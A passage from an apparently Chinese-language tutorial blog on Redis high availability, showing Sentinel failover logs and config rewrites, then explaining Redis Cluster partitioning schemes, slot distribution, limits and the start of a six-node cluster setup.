<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+odown master master 127.0.0.1 16379 #quorum 3/2</span><br></pre></td></tr></table></figure>
</li>
<li><p>Sentinal 进行 自动故障切换，协商选定 redis-26329 节点作为新的 主节点。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+switch-master master 127.0.0.1 16379 127.0.0.1 26379</span><br></pre></td></tr></table></figure>
</li>
<li><p>redis-36329 节点和已经 客观下线 的 redis-16329 节点成为 redis-26479 的 从节点。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">7954:X 22 Aug 18:48:25.710 * +slave slave 127.0.0.1:36379 127.0.0.1 36379 @ master 127.0.0.1 26379</span><br><span class="line">7954:X 22 Aug 18:48:25.711 * +slave slave 127.0.0.1:16379 127.0.0.1 16379 @ master 127.0.0.1 26379</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h4 id="Redis-的配置文件"><a href="#Redis-的配置文件" class="headerlink" title="Redis 的配置文件"></a>Redis 的配置文件</h4><p>分别查看三个 redis 节点的配置文件，发生 主从切换 时 redis.conf 的配置会自动发生刷新。</p>
<ul>
<li><p>节点 redis-16379</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">daemonize yes</span><br><span class="line">pidfile &quot;/var/run/redis-16379.pid&quot;</span><br><span class="line">logfile &quot;/var/log/redis/redis-16379.log&quot;</span><br><span class="line">port 16379</span><br><span class="line">bind 0.0.0.0</span><br><span class="line">timeout 300</span><br><span class="line">databases 16</span><br><span class="line">dbfilename &quot;dump-16379.db&quot;</span><br><span class="line">dir &quot;/usr/local/redis-sentinel/redis-workdir&quot;</span><br><span class="line">masterauth &quot;123456&quot;</span><br><span class="line">requirepass &quot;123456&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>节点 redis-26379</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">daemonize yes</span><br><span class="line">pidfile &quot;/var/run/redis-26379.pid&quot;</span><br><span class="line">logfile &quot;/var/log/redis/redis-26379.log&quot;</span><br><span class="line">port 26379</span><br><span class="line">bind 0.0.0.0</span><br><span class="line">timeout 300</span><br><span class="line">databases 16</span><br><span class="line">dbfilename &quot;dump-26379.db&quot;</span><br><span class="line">dir &quot;/usr/local/redis-sentinel/redis-workdir&quot;</span><br><span class="line">masterauth &quot;123456&quot;</span><br><span class="line">requirepass &quot;123456&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>节点 redis-36379</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">daemonize yes</span><br><span class="line">pidfile &quot;/var/run/redis-36379.pid&quot;</span><br><span class="line">logfile &quot;/var/log/redis/redis-36379.log&quot;</span><br><span class="line">port 36379</span><br><span class="line">bind 0.0.0.0</span><br><span class="line">timeout 300</span><br><span class="line">databases 16</span><br><span class="line">dbfilename &quot;dump-36379.db&quot;</span><br><span class="line">dir &quot;/usr/local/redis-sentinel/redis-workdir&quot;</span><br><span class="line">masterauth &quot;123456&quot;</span><br><span class="line">requirepass &quot;123456&quot;</span><br><span class="line">slaveof 127.0.0.1 26379</span><br></pre></td></tr></table></figure>

</li>
</ul>
<blockquote>
<p>分析：redis-26379 节点 <code>slaveof</code> 配置被移除，晋升为 主节点。redis-16379 节点处于 宕机状态。redis-36379 的 <code>slaveof</code> 配置更新为 127.0.0.1 redis-26379，成为 redis-26379 的 从节点。</p>
</blockquote>
<p>重启节点 redis-16379。待正常启动后，再次查看它的 redis.conf 文件，配置如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">daemonize yes</span><br><span class="line">pidfile &quot;/var/run/redis-16379.pid&quot;</span><br><span class="line">logfile &quot;/var/log/redis/redis-16379.log&quot;</span><br><span class="line">port 16379</span><br><span class="line">bind 0.0.0.0</span><br><span class="line">timeout 300</span><br><span class="line">databases 16</span><br><span class="line">dbfilename &quot;dump-16379.db&quot;</span><br><span class="line">dir &quot;/usr/local/redis-sentinel/redis-workdir&quot;</span><br><span class="line">masterauth &quot;123456&quot;</span><br><span class="line">requirepass &quot;123456&quot;</span><br><span class="line"># Generated by CONFIG REWRITE</span><br><span class="line">slaveof 127.0.0.1 26379</span><br></pre></td></tr></table></figure>

<p>节点 redis-16379 的配置文件新增一行 <code>slaveof</code> 配置属性，指向 redis-26379，即成为 新的主节点 的 从节点。</p>
<h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><p>本文首先对 Redis 实现高可用的几种模式做出了阐述，指出了 Redis 主从复制 的不足之处，进一步引入了 Redis Sentinel 哨兵模式 的相关概念，深入说明了 Redis Sentinel 的 具体功能，基本原理，高可用搭建 和 自动故障切换 验证等。<br>当然，Redis Sentinel 仅仅解决了 高可用 的问题，对于 主节点 单点写入和单节点无法扩容等问题，还需要引入 Redis Cluster 集群模式 予以解决。</p>
<hr>
<h1 id="集群模式搭建与原理详解"><a href="#集群模式搭建与原理详解" class="headerlink" title="集群模式搭建与原理详解"></a>集群模式搭建与原理详解</h1><h2 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a>前言</h2><p>在 Redis 3.0 之前，使用 哨兵（sentinel）机制来监控各个节点之间的状态。Redis Cluster 是 Redis 的 分布式解决方案，在 3.0 版本正式推出，有效地解决了 Redis 在 分布式 方面的需求。当遇到 单机内存、并发、流量 等瓶颈时，可以采用 Cluster 架构方案达到 负载均衡 的目的。  </p>
<p>本文将从 集群方案、数据分布、搭建集群、节点通信、集群伸缩、请求路由、故障转移、集群运维 等几个方面介绍 Redis Cluster。</p>
<h2 id="正文-2"><a href="#正文-2" class="headerlink" title="正文"></a>正文</h2><h3 id="Redis-集群方案"><a href="#Redis-集群方案" class="headerlink" title="Redis 集群方案"></a>Redis 集群方案</h3><p>Redis Cluster 集群模式通常具有 高可用、可扩展性、分布式、容错 等特性。Redis 分布式方案一般有两种：</p>
<h4 id="1、客户端分区方案"><a href="#1、客户端分区方案" class="headerlink" title="1、客户端分区方案"></a>1、客户端分区方案</h4><p>客户端 就已经决定数据会被 存储 到哪个 redis 节点或者从哪个 redis 节点 读取数据。其主要思想是采用 哈希算法 将 Redis 数据的 key 进行散列，通过 hash 函数，特定的 key 会 映射 到特定的 Redis 节点上。</p>
<figure class="image-box">
                <img src="165a4f9e74a09b36.png" alt title class>
                <p></p>
            </figure>

<p>客户端分区方案 的代表为 Redis Sharding，Redis Sharding 是 Redis Cluster 出来之前，业界普遍使用的 Redis 多实例集群 方法。Java 的 Redis 客户端驱动库 Jedis，支持 Redis Sharding 功能，即 ShardedJedis 以及 结合缓存池 的 ShardedJedisPool。</p>
<ul>
<li>优点<br>不使用 第三方中间件，分区逻辑 可控，配置 简单，节点之间无关联，容易 线性扩展，灵活性强。</li>
<li>缺点<br>客户端 无法 动态增删 服务节点，客户端需要自行维护 分发逻辑，客户端之间 无连接共享，会造成 连接浪费。</li>
</ul>
<h4 id="2、代理分区方案"><a href="#2、代理分区方案" class="headerlink" title="2、代理分区方案"></a>2、代理分区方案</h4><p>客户端 发送请求到一个 代理组件，代理 解析 客户端 的数据，并将请求转发至正确的节点，最后将结果回复给客户端。</p>
<ul>
<li>优点：简化 客户端 的分布式逻辑，客户端 透明接入，切换成本低，代理的 转发 和 存储 分离。</li>
<li>缺点：多了一层 代理层，加重了 架构部署复杂度 和 性能损耗。<figure class="image-box">
                <img src="165a4f9e6f8b3a44.png" alt title class>
                <p></p>
            </figure>

</li>
</ul>
<p>代理分区 主流实现的有方案有 Twemproxy 和 Codis。</p>
<h5 id="（1）Twemproxy"><a href="#（1）Twemproxy" class="headerlink" title="（1）Twemproxy"></a>（1）Twemproxy</h5><p>Twemproxy 也叫 nutcraker，是 twitter 开源的一个 redis 和 memcache 的 中间代理服务器 程序。Twemproxy 作为 代理，可接受来自多个程序的访问，按照 路由规则，转发给后台的各个 Redis 服务器，再原路返回。Twemproxy 存在 单点故障 问题，需要结合 Lvs 和 Keepalived 做 高可用方案。</p>
<figure class="image-box">
                <img src="165a4f9e751d0773.png" alt title class>
                <p></p>
            </figure>

<ul>
<li>优点：应用范围广，稳定性较高，中间代理层 高可用。</li>
<li>缺点：无法平滑地 水平扩容/缩容，无 可视化管理界面，运维不友好，出现故障，不能 自动转移。</li>
</ul>
<h5 id="（2）Codis"><a href="#（2）Codis" class="headerlink" title="（2）Codis"></a>（2）Codis</h5><p>Codis 是一个 分布式 Redis 解决方案，对于上层应用来说，连接 Codis-Proxy 和直接连接 原生的 Redis-Server 没有的区别。Codis 底层会 处理请求的转发，不停机的进行 数据迁移 等工作。Codis 采用了无状态的 代理层，对于 客户端 来说，一切都是透明的。</p>
<figure class="image-box">
                <img src="165a4f9e7509b300.png" alt title class>
                <p></p>
            </figure>

<ul>
<li>优点<br>实现了上层 Proxy 和底层 Redis 的 高可用，数据分片 和 自动平衡，提供 命令行接口 和 RESTful API，提供 监控 和 管理 界面，可以动态 添加 和 删除 Redis 节点。</li>
<li>缺点<br>部署架构 和 配置 复杂，不支持 跨机房 和 多租户，不支持 鉴权管理。</li>
</ul>
<h4 id="查询路由方案"><a href="#查询路由方案" class="headerlink" title="查询路由方案"></a>查询路由方案</h4><p>客户端随机地 请求任意一个 Redis 实例，然后由 Redis 将请求 转发 给 正确 的 Redis 节点。Redis Cluster 实现了一种 混合形式 的 查询路由，但并不是 直接 将请求从一个 Redis 节点 转发 到另一个 Redis 节点，而是在 客户端 的帮助下直接 重定向（ redirected）到正确的 Redis 节点。</p>
<figure class="image-box">
                <img src="165a4f9e84b4b379.png" alt title class>
                <p></p>
            </figure>

<ul>
<li>优点<br>无中心节点，数据按照 槽 存储分布在多个 Redis 实例上，可以平滑的进行节点 扩容/缩容，支持 高可用 和 自动故障转移，运维成本低。</li>
<li>缺点<br>严重依赖 Redis-trib 工具，缺乏 监控管理，需要依赖 Smart Client (维护连接，缓存路由表，MultiOp 和 Pipeline 支持)。Failover 节点的 检测过慢，不如 中心节点 ZooKeeper 及时。Gossip 消息具有一定开销。无法根据统计区分 冷热数据。</li>
</ul>
<h3 id="数据分布"><a href="#数据分布" class="headerlink" title="数据分布"></a>数据分布</h3><h4 id="数据分布理论"><a href="#数据分布理论" class="headerlink" title="数据分布理论"></a>数据分布理论</h4><p>分布式数据库 首先要解决把 整个数据集 按照 分区规则 映射到 多个节点 的问题，即把 数据集 划分到 多个节点 上，每个节点负责 整体数据 的一个 子集。</p>
<figure class="image-box">
                <img src="165a4f9e75424f0a.png" alt title class>
                <p></p>
            </figure>

<p>数据分布通常有 哈希分区 和 顺序分区 两种方式，对比如下：</p>
<table>
<thead>
<tr>
<th>分区方式</th>
<th>特点</th>
<th>相关产品</th>
</tr>
</thead>
<tbody><tr>
<td>哈希分区</td>
<td>离散程度好，数据分布与业务无关，无法顺序访问</td>
<td>Redis Cluster，Cassandra，Dynamo</td>
</tr>
<tr>
<td>顺序分区</td>
<td>离散程度易倾斜，数据分布与业务相关，可以顺序访问</td>
<td>BigTable，HBase，Hypertable</td>
</tr>
</tbody></table>
<p>由于 Redis Cluster 采用 哈希分区规则，这里重点讨论 哈希分区。常见的 哈希分区 规则有几种，下面分别介绍：</p>
<h5 id="1、节点取余分区"><a href="#1、节点取余分区" class="headerlink" title="1、节点取余分区"></a>1、节点取余分区</h5><p>使用特定的数据，如 Redis 的 键 或 用户 ID，再根据 节点数量 N 使用公式：<code>hash(key) % N</code> 计算出 哈希值，用来决定数据 映射 到哪一个节点上。</p>
<figure class="image-box">
                <img src="165a4f9f1b14840d.png" alt title class>
                <p></p>
            </figure>

<ul>
<li>优点<br>这种方式的突出优点是 简单性，常用于 数据库 的 分库分表规则。一般采用 预分区 的方式，提前根据 数据量 规划好 分区数，比如划分为 512 或 1024 张表，保证可支撑未来一段时间的 数据容量，再根据 负载情况 将 表 迁移到其他 数据库 中。扩容时通常采用 翻倍扩容，避免 数据映射 全部被 打乱，导致 全量迁移 的情况。</li>
<li>缺点<br>当 节点数量 变化时，如 扩容 或 收缩 节点，数据节点 映射关系 需要重新计算，会导致数据的 重新迁移。</li>
</ul>
<h5 id="2、一致性哈希分区"><a href="#2、一致性哈希分区" class="headerlink" title="2、一致性哈希分区"></a>2、一致性哈希分区</h5><p>一致性哈希 可以很好的解决 稳定性问题，可以将所有的 存储节点 排列在 收尾相接 的 Hash 环上，每个 key 在计算 Hash 后会 顺时针 找到 临接 的 存储节点 存放。而当有节点 加入 或 退出 时，仅影响该节点在 Hash 环上 顺时针相邻 的 后续节点。</p>
<figure class="image-box">
                <img src="165a4f9f1b2a7661.png" alt title class>
                <p></p>
            </figure>

<ul>
<li>优点<br>加入 和 删除 节点只影响 哈希环 中 顺时针方向 的 相邻的节点，对其他节点无影响。</li>
<li>缺点<br>加减节点 会造成 哈希环 中部分数据 无法命中。当使用 少量节点 时，节点变化 将大范围影响 哈希环 中 数据映射，不适合 少量数据节点 的分布式方案。普通 的 一致性哈希分区 在增减节点时需要 增加一倍 或 减去一半 节点才能保证 数据 和 负载的均衡。</li>
</ul>
<blockquote>
<p>注意：因为 一致性哈希分区 的这些缺点，一些分布式系统采用 虚拟槽 对 一致性哈希 进行改进，比如 Dynamo 系统。</p>
</blockquote>
<h5 id="3、虚拟槽分区"><a href="#3、虚拟槽分区" class="headerlink" title="3、虚拟槽分区"></a>3、虚拟槽分区</h5><p>虚拟槽分区 巧妙地使用了 哈希空间，使用 分散度良好 的 哈希函数 把所有数据 映射 到一个 固定范围 的 整数集合 中，整数定义为 槽（slot）。这个范围一般 远远大于 节点数，比如 Redis Cluster 槽范围是 0 ~ 16383。槽 是集群内 数据管理 和 迁移 的 基本单位。采用 大范围槽 的主要目的是为了方便 数据拆分 和 集群扩展。每个节点会负责 一定数量的槽，如图所示：</p>
<figure class="image-box">
                <img src="165a4f9f644d509a.png" alt title class>
                <p></p>
            </figure>

<p>当前集群有 5 个节点，每个节点平均大约负责 3276 个 槽。由于采用 高质量 的 哈希算法，每个槽所映射的数据通常比较 均匀，将数据平均划分到 5 个节点进行 数据分区。Redis Cluster 就是采用 虚拟槽分区。</p>
<ul>
<li>节点1： 包含 0 到 3276 号哈希槽。</li>
<li>节点2：包含 3277  到 6553 号哈希槽。</li>
<li>节点3：包含 6554 到 9830 号哈希槽。</li>
<li>节点4：包含 9831 到 13107 号哈希槽。</li>
<li>节点5：包含 13108 到 16383 号哈希槽。</li>
</ul>
<p>这种结构很容易 添加 或者 删除 节点。如果 增加 一个节点 6，就需要从节点 1 ~ 5 获得部分 槽 分配到节点 6 上。如果想 移除 节点 1，需要将节点 1 中的 槽 移到节点 2 ~ 5 上，然后将 没有任何槽 的节点 1 从集群中 移除 即可。</p>
<blockquote>
<p>由于从一个节点将 哈希槽 移动到另一个节点并不会 停止服务，所以无论 添加删除 或者 改变 某个节点的 哈希槽的数量 都不会造成 集群不可用 的状态。</p>
</blockquote>
<h4 id="Redis-的数据分区"><a href="#Redis-的数据分区" class="headerlink" title="Redis 的数据分区"></a>Redis 的数据分区</h4><p>Redis Cluster 采用 虚拟槽分区，所有的 键 根据 哈希函数 映射到 0~16383 整数槽内，计算公式：<code>slot = CRC16(key) &amp; 16383</code>。每个节点负责维护一部分槽以及槽所映射的 键值数据，如图所示：</p>
<figure class="image-box">
                <img src="165a4f9f56a93231.png" alt title class>
                <p></p>
            </figure>

<h5 id="Redis-虚拟槽分区的特点"><a href="#Redis-虚拟槽分区的特点" class="headerlink" title="Redis 虚拟槽分区的特点"></a>Redis 虚拟槽分区的特点</h5><ul>
<li>解耦 数据 和 节点 之间的关系，简化了节点 扩容 和 收缩 难度。</li>
<li>节点自身 维护槽的 映射关系，不需要 客户端 或者 代理服务 维护 槽分区元数据。</li>
<li>支持 节点、槽、键 之间的 映射查询，用于 数据路由、在线伸缩 等场景。</li>
</ul>
<h4 id="Redis-集群的功能限制"><a href="#Redis-集群的功能限制" class="headerlink" title="Redis 集群的功能限制"></a>Redis 集群的功能限制</h4><p>Redis 集群相对 单机 在功能上存在一些限制，需要 开发人员 提前了解，在使用时做好规避。</p>
<ul>
<li>key 批量操作 支持有限。<br>类似 mset、mget 操作，目前只支持对具有相同 slot 值的 key 执行 批量操作。对于 映射为不同 slot 值的 key 由于执行 mset、mget 等操作可能存在于多个节点上，因此不被支持。</li>
<li>key 事务操作 支持有限。<br>只支持 多 key 在 同一节点上 的 事务操作，当多个 key 分布在 不同 的节点上时 无法 使用事务功能。</li>
<li>key 作为 数据分区 的最小粒度<br>不能将一个 大的键值 对象如 hash、list 等映射到 不同的节点。</li>
<li>不支持 多数据库空间<br>单机 下的 Redis 可以支持 16 个数据库（db0 ~ db15），集群模式 下只能使用 一个 数据库空间，即 db0。</li>
<li>复制结构 只支持一层<br>从节点 只能复制 主节点，不支持 嵌套树状复制 结构。</li>
</ul>
<h3 id="Redis-集群搭建"><a href="#Redis-集群搭建" class="headerlink" title="Redis 集群搭建"></a>Redis 集群搭建</h3><p>Redis-Cluster 是 Redis 官方的一个 高可用 解决方案，Cluster 中的 Redis 共有 2^14（16384） 个 slot 槽。创建 Cluster 后，槽 会 平均分配 到每个 Redis 节点上。<br>下面介绍一下本机启动 6 个 Redis 的 集群服务，并使用 redis-trib.rb 创建 3主3从 的 集群。搭建集群工作需要以下三个步骤：</p>
<h4 id="1、准备节点"><a href="#1、准备节点" class="headerlink" title="1、准备节点"></a>1、准备节点</h4><p>Redis 集群一般由 多个节点 组成，节点数量至少为 6 个，才能保证组成 完整高可用 的集群。每个节点需要 开启配置 <code>cluster-enabled yes</code>，让 Redis 运行在 集群模式 下。  </p>
<p>Redis 集群的节点规划如下：</p>
<table>
<thead>
<tr>
<th>节点名称</th>
<th>端口号</th>
<th>是主是从</th>
<th>所属主节点</th>
</tr>
</thead>
<tbody><tr>
<td>redis-6379</td>
<td>6379</td>
<td>主节点</td>
<td>—</td>
</tr>
<tr>
<td>redis-6389</td>
<td>6389</td>
<td>从节点</td>
<td>redis-6379</td>
</tr>
<tr>
<td>redis-6380</td>
<td>6380</td>
<td>主节点</td>
<td>—</td>
</tr>
<tr>
<td>redis-6390</td>
<td>6390</td>
<td>从节点</td>
<td>redis-6380</td>
</tr>
<tr>
<td>redis-6381</td>
<td>6381</td>
<td>主节点</td>
<td>—</td>
</tr>
<tr>
<td>redis-6391</td>
<td>6391</td>
<td>从节点</td>
<td>redis-6381</td>
</tr>
</tbody></table>
<blockquote>
<p>注意：建议为集群内 所有节点 统一目录，一般划分三个目录：conf、data、log，分别存放 配置、数据 和 日志 相关文件。把 6 个节点配置统一放在 conf 目录下。</p>
</blockquote>
<h5 id="（1）创建-redis-各实例目录"><a href="#（1）创建-redis-各实例目录" class="headerlink" title="（1）创建 redis 各实例目录"></a>（1）创建 redis 各实例目录</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo mkdir -p /usr/<span class="built_in">local</span>/redis-cluster</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> /usr/<span class="built_in">local</span>/redis-cluster</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo mkdir conf data <span class="built_in">log</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo mkdir -p data/redis-6379 data/redis-6389 data/redis-6380 data/redis-6390 data/redis-6381 data/redis-6391</span></span><br></pre></td></tr></table></figure>

<h5 id="（2）redis-配置文件管理"><a href="#（2）redis-配置文件管理" class="headerlink" title="（2）redis 配置文件管理"></a>（2）redis 配置文件管理</h5><p>根据以下 模板 配置各个实例的 redis.conf，以下只是搭建集群需要的 基本配置，可能需要根据实际情况做修改。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># redis后台运行</span></span><br><span class="line">daemonize yes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绑定的主机端口</span></span><br><span class="line"><span class="built_in">bind</span> 127.0.0.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据存放目录</span></span><br><span class="line">dir /usr/<span class="built_in">local</span>/redis-cluster/data/redis-6379</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进程文件</span></span><br><span class="line">pidfile /var/run/redis-cluster/<span class="variable">$&#123;自定义&#125;</span>.pid</span><br><span class="line"></span><br><span class="line"><span class="comment"># 日志文件</span></span><br><span class="line">logfile /usr/<span class="built_in">local</span>/redis-cluster/<span class="built_in">log</span>/<span class="variable">$&#123;自定义&#125;</span>.<span class="built_in">log</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 端口号</span></span><br><span class="line">port 6379</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启集群模式，把注释#去掉</span></span><br><span class="line">cluster-enabled yes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 集群的配置，配置文件首次启动自动生成</span></span><br><span class="line">cluster-config-file /usr/<span class="built_in">local</span>/redis-cluster/conf/<span class="variable">$&#123;自定义&#125;</span>.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求超时，设置10秒</span></span><br><span class="line">cluster-node-timeout 10000</span><br><span class="line"></span><br><span class="line"><span class="comment"># aof日志开启，有需要就开启，它会每次写操作都记录一条日志</span></span><br><span class="line">appendonly yes</span><br></pre></td></tr></table></figure>

<ul>
<li><p>redis-6379.conf</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">daemonize yes</span><br><span class="line">bind 127.0.0.1</span><br><span class="line">dir /usr/local/redis-cluster/data/redis-6379</span><br><span class="line">pidfile /var/run/redis-cluster/redis-6379.pid</span><br><span class="line">logfile /usr/local/redis-cluster/log/redis-6379.log</span><br><span class="line">port 6379</span><br><span class="line">cluster-enabled yes</span><br><span class="line">cluster-config-file /usr/local/redis-cluster/conf/node-6379.conf</span><br><span class="line">cluster-node-timeout 10000</span><br><span class="line">appendonly yes</span><br></pre></td></tr></table></figure>
</li>
<li><p>redis-6389.conf</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">daemonize yes</span><br><span class="line">bind 127.0.0.1</span><br><span class="line">dir /usr/local/redis-cluster/data/redis-6389</span><br><span class="line">pidfile /var/run/redis-cluster/redis-6389.pid</span><br><span class="line">logfile /usr/local/redis-cluster/log/redis-6389.log</span><br><span class="line">port 6389</span><br><span class="line">cluster-enabled yes</span><br><span class="line">cluster-config-file /usr/local/redis-cluster/conf/node-6389.conf</span><br><span class="line">cluster-node-timeout 10000</span><br><span class="line">appendonly yes</span><br></pre></td></tr></table></figure>
</li>
<li><p>redis-6380.conf</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">daemonize yes</span><br><span class="line">bind 127.0.0.1</span><br><span class="line">dir /usr/local/redis-cluster/data/redis-6380</span><br><span class="line">pidfile /var/run/redis-cluster/redis-6380.pid</span><br><span class="line">logfile /usr/local/redis-cluster/log/redis-6380.log</span><br><span class="line">port 6380</span><br><span class="line">cluster-enabled yes</span><br><span class="line">cluster-config-file /usr/local/redis-cluster/conf/node-6380.conf</span><br><span class="line">cluster-node-timeout 10000</span><br><span class="line">appendonly yes</span><br></pre></td></tr></table></figure>
</li>
<li><p>redis-6390.conf</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">daemonize yes</span><br><span class="line">bind 127.0.0.1</span><br><span class="line">dir /usr/local/redis-cluster/data/redis-6390</span><br><span class="line">pidfile /var/run/redis-cluster/redis-6390.pid</span><br><span class="line">logfile /usr/local/redis-cluster/log/redis-6390.log</span><br><span class="line">port 6390</span><br><span class="line">cluster-enabled yes</span><br><span class="line">cluster-config-file /usr/local/redis-cluster/conf/node-6390.conf</span><br><span class="line">cluster-node-timeout 10000</span><br><span class="line">appendonly yes</span><br></pre></td></tr></table></figure>
</li>
<li><p>redis-6381.conf</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">daemonize yes</span><br><span class="line">bind 127.0.0.1</span><br><span class="line">dir /usr/local/redis-cluster/data/redis-6381</span><br><span class="line">pidfile /var/run/redis-cluster/redis-6381.pid</span><br><span class="line">logfile /usr/local/redis-cluster/log/redis-6381.log</span><br><span class="line">port 6381</span><br><span class="line">cluster-enabled yes</span><br><span class="line">cluster-config-file /usr/local/redis-cluster/conf/node-6381.conf</span><br><span class="line">cluster-node-timeout 10000</span><br><span class="line">appendonly yes</span><br></pre></td></tr></table></figure>
</li>
<li><p>redis-6391.conf</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">daemonize yes</span><br><span class="line">bind 127.0.0.1</span><br><span class="line">dir /usr/local/redis-cluster/data/redis-6391</span><br><span class="line">pidfile /var/run/redis-cluster/redis-6391.pid</span><br><span class="line">logfile /usr/local/redis-cluster/log/redis-6391.log</span><br><span class="line">port 6391</span><br><span class="line">cluster-enabled yes</span><br><span class="line">cluster-config-file /usr/local/redis-cluster/conf/node-6391.conf</span><br><span class="line">cluster-node-timeout 10000</span><br><span class="line">appendonly yes</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h4 id="2、环境准备"><a href="#2、环境准备" class="headerlink" title="2、环境准备"></a>2、环境准备</h4><h5 id="（1）安装-Ruby-环境"><a href="#（1）安装-Ruby-环境" class="headerlink" title="（1）安装 Ruby 环境"></a>（1）安装 Ruby 环境</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo brew install ruby</span></span><br></pre></td></tr></table></figure>

<h5 id="（2）准备-rubygem-redis-依赖"><a href="#（2）准备-rubygem-redis-依赖" class="headerlink" title="（2）准备 rubygem redis 依赖"></a>（2）准备 rubygem redis 依赖</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo gem install redis</span></span><br><span class="line">Password:</span><br><span class="line">Fetching: redis-4.0.2.gem (100%)</span><br><span class="line">Successfully installed redis-4.0.2</span><br><span class="line">Parsing documentation for redis-4.0.2</span><br><span class="line">Installing ri documentation for redis-4.0.2</span><br><span class="line">Done installing 